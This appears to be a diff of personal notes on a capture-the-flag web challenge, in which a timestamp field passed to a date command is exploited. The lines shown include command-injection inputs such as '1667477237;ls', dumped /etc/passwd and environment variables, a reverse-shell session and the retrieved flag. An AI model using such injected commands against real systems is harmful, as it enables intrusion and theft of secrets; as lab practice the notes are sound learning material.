@@ -177,7 +177,6 @@ https://www.epochconverter.com/
 
 1667477237;ls
 
-
 Thu Nov  3 12:07:17 UTC 2022
 go.mod
 go.sum
@@ -192,7 +191,6 @@ views
 ┌──(kali㉿kali)-[~]
 └─$ date -d @1667483948
 Thu Nov  3 09:59:08 AM EDT 2022
-
 
 1667477237;which python
 exit status 1
@@ -235,7 +233,6 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 challenge:x:1000:1000::/home/challenge:/bin/sh
 
-
 date: invalid date '@'
 HOSTNAME=e7c1352e71ec
 PWD=/home/challenge
@@ -262,7 +259,6 @@ bash: no job control in this shell
 challenge@e7c1352e71ec:~$ echo $FLAG
 echo $FLAG
 flag{7da6c7debd40bd611560c13d8149b647}
-
 
 it works, maybe need to fix my machine 😔 
 
@@ -305,7 +301,6 @@ To                         Action      From
 using a range from 1 to 65535 max port scanning through rustscan, now testing printnightmare :)
 
 sudo ufw allow 1:65535/tcp
-
 
 ┌──(kali㉿kali)-[~]
 └─$ sudo iptables -L                
@@ -382,14 +377,10 @@ challenge@e7c1352e71ec:~$ echo $FLAG
 echo $FLAG
 flag{7da6c7debd40bd611560c13d8149b647}
 
-
 ```
-
-![[Pasted image 20221103071230.png]]
 
 Find the flag in this vulnerable web application!
 The developer likes to store data in environment variables, can you find anything of interest there?
 *flag{7da6c7debd40bd611560c13d8149b647}*
-
 
 [[Responder]]
